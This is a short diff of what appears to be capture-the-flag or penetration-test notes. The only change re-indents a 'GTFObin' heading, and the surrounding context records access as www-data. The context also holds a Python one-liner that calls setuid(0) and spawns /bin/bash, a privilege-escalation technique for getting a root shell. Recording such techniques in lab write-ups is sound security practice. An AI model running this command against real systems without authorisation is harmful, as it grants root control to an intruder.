@@ -97,7 +97,7 @@ Gained Access As: www-data
 /usr/bin/python
 ```
     
-    GTFObin:
+ GTFObin:
     ```
     /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
     ```
